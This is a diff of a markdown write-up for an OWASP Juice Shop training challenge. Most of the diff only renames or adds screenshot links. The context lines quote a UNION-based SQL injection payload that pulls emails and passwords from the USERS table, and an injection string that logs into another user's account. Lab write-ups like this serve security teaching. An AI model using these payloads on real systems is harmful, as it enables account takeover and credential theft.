@@ -13,16 +13,19 @@ Reused the UNION-based SQLi payload from the User Credentials challenge to retri
 ```
 XX'))+UNION+SELECT+email,password,'3','4','5','6','7','8','9'+FROM+USERS--
 ```
+![SQL injection response](../assets/img-064.png)
 
 Scrolled through the retrieved data and found Chris's credentials.
 
-![Chris's credentials in exfiltrated data](../assets/20-gdpr-erasure-1.png)
+![Chris's credentials in exfiltrated data](../assets/img-065.png)
 
 Used SQL injection to login into Chris's account: `chris.pike@juice-sh.op'--`
 
-![Login with Chris's erased account](../assets/20-gdpr-erasure-2.png)
+![Login with Chris's erased account](../assets/img-066.png)
 
 Challenge solved.
+
+![Challenge solved](../assets/img-067.png)
 
 ## Vulnerability Explanation
 
